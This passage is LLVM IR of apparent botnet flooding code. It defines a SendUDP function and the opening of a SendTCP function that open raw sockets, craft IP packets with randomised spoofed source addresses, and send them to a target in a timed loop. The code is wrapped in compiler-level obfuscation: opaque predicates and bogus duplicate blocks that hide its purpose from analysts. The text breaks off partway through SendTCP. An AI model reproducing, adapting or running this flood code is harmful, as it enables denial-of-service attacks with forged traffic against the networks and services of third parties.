declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %302

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %302

; <label>:50:                                     ; preds = %42
  %51 = load i32, i32* @x.77
  %52 = load i32, i32* @y.78
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  store i32 1, i32* %16, align 4
  %59 = load i32, i32* %15, align 4
  %60 = bitcast i32* %16 to i8*
  %61 = call i32 @setsockopt(i32 %59, i32 0, i32 3, i8* %60, i32 4) #5
  %62 = icmp slt i32 %61, 0
  %63 = load i32, i32* @x.77
  %64 = load i32, i32* @y.78
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %62, label %71, label %88

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = load i32, i32* @x.77
  %73 = load i32, i32* @y.78
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %71
  %80 = load i32, i32* @x.77
  %81 = load i32, i32* @y.78
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %302

; <label>:88:                                     ; preds = %originalBBpart2
  store i32 50, i32* %17, align 4
  br label %89

; <label>:89:                                     ; preds = %93, %88
  %90 = load i32, i32* %17, align 4
  %91 = add nsw i32 %90, -1
  store i32 %91, i32* %17, align 4
  %92 = icmp ne i32 %90, 0
  br i1 %92, label %93, label %100

; <label>:93:                                     ; preds = %89
  %94 = call i64 @time(i64* null) #5
  %95 = call i32 @rand_cmwc()
  %96 = zext i32 %95 to i64
  %97 = xor i64 %94, %96
  %98 = trunc i64 %97 to i32
  call void @srand(i32 %98) #5
  %99 = call i32 @rand() #5
  call void @init_rand(i32 %99)
  br label %89

; <label>:100:                                    ; preds = %89
  %101 = load i32, i32* @x.77
  %102 = load i32, i32* @y.78
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %100
  %109 = load i32, i32* %12, align 4
  %110 = sub nsw i32 32, %109
  %111 = shl i32 1, %110
  %112 = sub nsw i32 %111, 1
  %113 = xor i32 %112, -1
  store i32 %113, i32* %18, align 4
  %114 = load i32, i32* %10, align 4
  %115 = sext i32 %114 to i64
  %116 = add i64 28, %115
  %117 = call i8* @llvm.stacksave()
  store i8* %117, i8** %19, align 8
  %118 = alloca i8, i64 %116, align 16
  %119 = bitcast i8* %118 to %struct.iphdr*
  store %struct.iphdr* %119, %struct.iphdr** %20, align 8
  %120 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %121 = bitcast %struct.iphdr* %120 to i8*
  %122 = getelementptr i8, i8* %121, i64 20
  %123 = bitcast i8* %122 to %struct.udphdr*
  store %struct.udphdr* %123, %struct.udphdr** %21, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %125 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %126 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %125, i32 0, i32 0
  %127 = load i32, i32* %126, align 4
  %128 = load i32, i32* %18, align 4
  %129 = call i32 @getRandomIP(i32 %128)
  %130 = call i32 @htonl(i32 %129) #10
  %131 = load i32, i32* %10, align 4
  %132 = sext i32 %131 to i64
  %133 = add i64 8, %132
  %134 = trunc i64 %133 to i32
  call void @makeIPPacket(%struct.iphdr* %124, i32 %127, i32 %130, i8 zeroext 17, i32 %134)
  %135 = load i32, i32* %10, align 4
  %136 = sext i32 %135 to i64
  %137 = add i64 8, %136
  %138 = trunc i64 %137 to i16
  %139 = call zeroext i16 @htons(i16 zeroext %138) #10
  %140 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  %142 = bitcast %union.anon.1* %141 to %struct.anon.2*
  %143 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %142, i32 0, i32 2
  store i16 %139, i16* %143, align 2
  %144 = call i32 @rand_cmwc()
  %145 = trunc i32 %144 to i16
  %146 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %147 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %146, i32 0, i32 0
  %148 = bitcast %union.anon.1* %147 to %struct.anon.2*
  %149 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %148, i32 0, i32 0
  store i16 %145, i16* %149, align 2
  %150 = load i32, i32* %8, align 4
  %151 = icmp eq i32 %150, 0
  %152 = load i32, i32* @x.77
  %153 = load i32, i32* @y.78
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBBpart277, label %originalBB6alteredBB

originalBBpart277:                                ; preds = %originalBB6
  br i1 %151, label %160, label %162

; <label>:160:                                    ; preds = %originalBBpart277
  %161 = call i32 @rand_cmwc()
  br label %183

; <label>:162:                                    ; preds = %originalBBpart277
  %163 = load i32, i32* @x.77
  %164 = load i32, i32* @y.78
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %162
  %171 = load i32, i32* %8, align 4
  %172 = trunc i32 %171 to i16
  %173 = call zeroext i16 @htons(i16 zeroext %172) #10
  %174 = zext i16 %173 to i32
  %175 = load i32, i32* @x.77
  %176 = load i32, i32* @y.78
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %183

; <label>:183:                                    ; preds = %originalBBpart281, %160
  %184 = phi i32 [ %161, %160 ], [ %174, %originalBBpart281 ]
  %185 = load i32, i32* @x.77
  %186 = load i32, i32* @y.78
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %183
  %193 = trunc i32 %184 to i16
  %194 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.1* %195 to %struct.anon.2*
  %197 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %196, i32 0, i32 1
  store i16 %193, i16* %197, align 2
  %198 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 0
  %200 = bitcast %union.anon.1* %199 to %struct.anon.2*
  %201 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %200, i32 0, i32 3
  store i16 0, i16* %201, align 2
  %202 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %203 = bitcast %struct.udphdr* %202 to i8*
  %204 = getelementptr inbounds i8, i8* %203, i64 8
  %205 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %204, i32 %205)
  %206 = bitcast i8* %118 to i16*
  %207 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 2
  %209 = load i16, i16* %208, align 2
  %210 = zext i16 %209 to i32
  %211 = call zeroext i16 @csum(i16* %206, i32 %210)
  %212 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 7
  store i16 %211, i16* %213, align 2
  %214 = call i64 @time(i64* null) #5
  %215 = load i32, i32* %9, align 4
  %216 = sext i32 %215 to i64
  %217 = add nsw i64 %214, %216
  %218 = trunc i64 %217 to i32
  store i32 %218, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %219 = load i32, i32* @x.77
  %220 = load i32, i32* @y.78
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart291, label %originalBB83alteredBB

originalBBpart291:                                ; preds = %originalBB83
  br label %227

; <label>:227:                                    ; preds = %297, %originalBBpart295, %originalBBpart291
  br label %228

; <label>:228:                                    ; preds = %227
  %229 = load i32, i32* %15, align 4
  %230 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %231 = call i64 @sendto(i32 %229, i8* %118, i64 %116, i32 0, %struct.sockaddr* %230, i32 16)
  %232 = call i32 @rand_cmwc()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.1* %235 to %struct.anon.2*
  %237 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %236, i32 0, i32 0
  store i16 %233, i16* %237, align 2
  %238 = load i32, i32* %8, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %242

; <label>:240:                                    ; preds = %228
  %241 = call i32 @rand_cmwc()
  br label %247

; <label>:242:                                    ; preds = %228
  %243 = load i32, i32* %8, align 4
  %244 = trunc i32 %243 to i16
  %245 = call zeroext i16 @htons(i16 zeroext %244) #10
  %246 = zext i16 %245 to i32
  br label %247

; <label>:247:                                    ; preds = %242, %240
  %248 = phi i32 [ %241, %240 ], [ %246, %242 ]
  %249 = trunc i32 %248 to i16
  %250 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon.1* %251 to %struct.anon.2*
  %253 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %252, i32 0, i32 1
  store i16 %249, i16* %253, align 2
  %254 = call i32 @rand_cmwc()
  %255 = trunc i32 %254 to i16
  %256 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %257 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %256, i32 0, i32 3
  store i16 %255, i16* %257, align 4
  %258 = load i32, i32* %18, align 4
  %259 = call i32 @getRandomIP(i32 %258)
  %260 = call i32 @htonl(i32 %259) #10
  %261 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 8
  store i32 %260, i32* %262, align 4
  %263 = bitcast i8* %118 to i16*
  %264 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 2
  %266 = load i16, i16* %265, align 2
  %267 = zext i16 %266 to i32
  %268 = call zeroext i16 @csum(i16* %263, i32 %267)
  %269 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 %268, i16* %270, align 2
  %271 = load i32, i32* %23, align 4
  %272 = load i32, i32* %14, align 4
  %273 = icmp eq i32 %271, %272
  br i1 %273, label %274, label %297

; <label>:274:                                    ; preds = %247
  %275 = call i64 @time(i64* null) #5
  %276 = load i32, i32* %22, align 4
  %277 = sext i32 %276 to i64
  %278 = icmp sgt i64 %275, %277
  br i1 %278, label %279, label %280

; <label>:279:                                    ; preds = %274
  br label %300

; <label>:280:                                    ; preds = %274
  %281 = load i32, i32* @x.77
  %282 = load i32, i32* @y.78
  %283 = sub i32 %281, 1
  %284 = mul i32 %281, %283
  %285 = urem i32 %284, 2
  %286 = icmp eq i32 %285, 0
  %287 = icmp slt i32 %282, 10
  %288 = or i1 %286, %287
  br i1 %288, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %280
  store i32 0, i32* %23, align 4
  %289 = load i32, i32* @x.77
  %290 = load i32, i32* @y.78
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br label %227

; <label>:297:                                    ; preds = %247
  %298 = load i32, i32* %23, align 4
  %299 = add i32 %298, 1
  store i32 %299, i32* %23, align 4
  br label %227

; <label>:300:                                    ; preds = %279
  %301 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %301)
  br label %302

; <label>:302:                                    ; preds = %300, %originalBBpart24, %49, %41
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %50
  store i32 1, i32* %16, align 4
  %303 = load i32, i32* %15, align 4
  %304 = bitcast i32* %16 to i8*
  %305 = call i32 @setsockopt(i32 %303, i32 0, i32 3, i8* %304, i32 4) #5
  %306 = icmp slt i32 %305, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %71
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %100
  %307 = load i32, i32* %12, align 4
  %_ = shl i32 32, %307
  %_7 = sub i32 0, 32
  %gen = add i32 %_7, %307
  %_8 = shl i32 32, %307
  %_9 = sub i32 32, %307
  %gen10 = mul i32 %_9, %307
  %_11 = shl i32 32, %307
  %_12 = sub i32 32, %307
  %gen13 = mul i32 %_12, %307
  %_14 = sub i32 0, 32
  %gen15 = add i32 %_14, %307
  %308 = sub nsw i32 32, %307
  %_16 = sub i32 1, %308
  %gen17 = mul i32 %_16, %308
  %_18 = shl i32 1, %308
  %_19 = shl i32 1, %308
  %_20 = sub i32 1, %308
  %gen21 = mul i32 %_20, %308
  %_22 = sub i32 1, %308
  %gen23 = mul i32 %_22, %308
  %309 = shl i32 1, %308
  %_24 = sub i32 %309, 1
  %gen25 = mul i32 %_24, 1
  %_26 = shl i32 %309, 1
  %_27 = sub i32 0, %309
  %gen28 = add i32 %_27, 1
  %310 = sub nsw i32 %309, 1
  %_29 = sub i32 0, %310
  %gen30 = add i32 %_29, -1
  %_31 = sub i32 %310, -1
  %gen32 = mul i32 %_31, -1
  %_33 = sub i32 %310, -1
  %gen34 = mul i32 %_33, -1
  %_35 = sub i32 %310, -1
  %gen36 = mul i32 %_35, -1
  %_37 = sub i32 %310, -1
  %gen38 = mul i32 %_37, -1
  %_39 = sub i32 0, %310
  %gen40 = add i32 %_39, -1
  %311 = xor i32 %310, -1
  store i32 %311, i32* %18, align 4
  %312 = load i32, i32* %10, align 4
  %313 = sext i32 %312 to i64
  %_41 = sub i64 0, 28
  %gen42 = add i64 %_41, %313
  %_43 = sub i64 28, %313
  %gen44 = mul i64 %_43, %313
  %_45 = sub i64 0, 28
  %gen46 = add i64 %_45, %313
  %_47 = sub i64 28, %313
  %gen48 = mul i64 %_47, %313
  %_49 = shl i64 28, %313
  %_50 = sub i64 28, %313
  %gen51 = mul i64 %_50, %313
  %_52 = sub i64 28, %313
  %gen53 = mul i64 %_52, %313
  %_54 = sub i64 0, 28
  %gen55 = add i64 %_54, %313
  %314 = add i64 28, %313
  %315 = call i8* @llvm.stacksave()
  store i8* %315, i8** %19, align 8
  %316 = alloca i8, i64 %314, align 16
  %317 = bitcast i8* %316 to %struct.iphdr*
  store %struct.iphdr* %317, %struct.iphdr** %20, align 8
  %318 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %319 = bitcast %struct.iphdr* %318 to i8*
  %320 = getelementptr i8, i8* %319, i64 20
  %321 = bitcast i8* %320 to %struct.udphdr*
  store %struct.udphdr* %321, %struct.udphdr** %21, align 8
  %322 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %323 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %324 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 4
  %326 = load i32, i32* %18, align 4
  %327 = call i32 @getRandomIP(i32 %326)
  %328 = call i32 @htonl(i32 %327) #10
  %329 = load i32, i32* %10, align 4
  %330 = sext i32 %329 to i64
  %_56 = sub i64 0, 8
  %gen57 = add i64 %_56, %330
  %_58 = sub i64 8, %330
  %gen59 = mul i64 %_58, %330
  %_60 = sub i64 8, %330
  %gen61 = mul i64 %_60, %330
  %_62 = sub i64 8, %330
  %gen63 = mul i64 %_62, %330
  %_64 = sub i64 8, %330
  %gen65 = mul i64 %_64, %330
  %_66 = sub i64 8, %330
  %gen67 = mul i64 %_66, %330
  %_68 = sub i64 0, 8
  %gen69 = add i64 %_68, %330
  %_70 = sub i64 8, %330
  %gen71 = mul i64 %_70, %330
  %331 = add i64 8, %330
  %332 = trunc i64 %331 to i32
  call void @makeIPPacket(%struct.iphdr* %322, i32 %325, i32 %328, i8 zeroext 17, i32 %332)
  %333 = load i32, i32* %10, align 4
  %334 = sext i32 %333 to i64
  %_72 = sub i64 8, %334
  %gen73 = mul i64 %_72, %334
  %_74 = sub i64 0, 8
  %gen75 = add i64 %_74, %334
  %335 = add i64 8, %334
  %336 = trunc i64 %335 to i16
  %337 = call zeroext i16 @htons(i16 zeroext %336) #10
  %338 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i32 0, i32 0
  %340 = bitcast %union.anon.1* %339 to %struct.anon.2*
  %341 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %340, i32 0, i32 2
  store i16 %337, i16* %341, align 2
  %342 = call i32 @rand_cmwc()
  %343 = trunc i32 %342 to i16
  %344 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %345 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %344, i32 0, i32 0
  %346 = bitcast %union.anon.1* %345 to %struct.anon.2*
  %347 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %346, i32 0, i32 0
  store i16 %343, i16* %347, align 2
  %348 = load i32, i32* %8, align 4
  %349 = icmp eq i32 %348, 0
  br label %originalBB6

originalBB79alteredBB:                            ; preds = %originalBB79, %162
  %350 = load i32, i32* %8, align 4
  %351 = trunc i32 %350 to i16
  %352 = call zeroext i16 @htons(i16 zeroext %351) #10
  %353 = zext i16 %352 to i32
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %183
  %354 = trunc i32 %184 to i16
  %355 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %356 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %355, i32 0, i32 0
  %357 = bitcast %union.anon.1* %356 to %struct.anon.2*
  %358 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %357, i32 0, i32 1
  store i16 %354, i16* %358, align 2
  %359 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %360 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %359, i32 0, i32 0
  %361 = bitcast %union.anon.1* %360 to %struct.anon.2*
  %362 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %361, i32 0, i32 3
  store i16 0, i16* %362, align 2
  %363 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %364 = bitcast %struct.udphdr* %363 to i8*
  %365 = getelementptr inbounds i8, i8* %364, i64 8
  %366 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %365, i32 %366)
  %367 = bitcast i8* %118 to i16*
  %368 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 2
  %370 = load i16, i16* %369, align 2
  %371 = zext i16 %370 to i32
  %372 = call zeroext i16 @csum(i16* %367, i32 %371)
  %373 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 7
  store i16 %372, i16* %374, align 2
  %375 = call i64 @time(i64* null) #5
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %_84 = sub i64 0, %375
  %gen85 = add i64 %_84, %377
  %_86 = sub i64 0, %375
  %gen87 = add i64 %_86, %377
  %_88 = sub i64 %375, %377
  %gen89 = mul i64 %_88, %377
  %378 = add nsw i64 %375, %377
  %379 = trunc i64 %378 to i32
  store i32 %379, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %originalBB83

originalBB93alteredBB:                            ; preds = %originalBB93, %280
  store i32 0, i32* %23, align 4
  br label %originalBB93
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #6

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #10
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.79
  %46 = load i32, i32* @y.80
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.79
  %54 = load i32, i32* @y.80
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %575

; <label>:61:                                     ; preds = %39
  %62 = load i32, i32* @x.79
  %63 = load i32, i32* @y.80
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %71 = getelementptr inbounds [8 x i8], [8 x i8]* %70, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %71, i8 0, i64 8, i32 4, i1 false)
  %72 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %72, i32* %17, align 4
  %73 = load i32, i32* %17, align 4
  %74 = icmp ne i32 %73, 0
  %75 = load i32, i32* @x.79
  %76 = load i32, i32* @y.80
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %100, label %83

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = load i32, i32* @x.79
  %85 = load i32, i32* @y.80
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %83
  %92 = load i32, i32* @x.79
  %93 = load i32, i32* @y.80
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %575

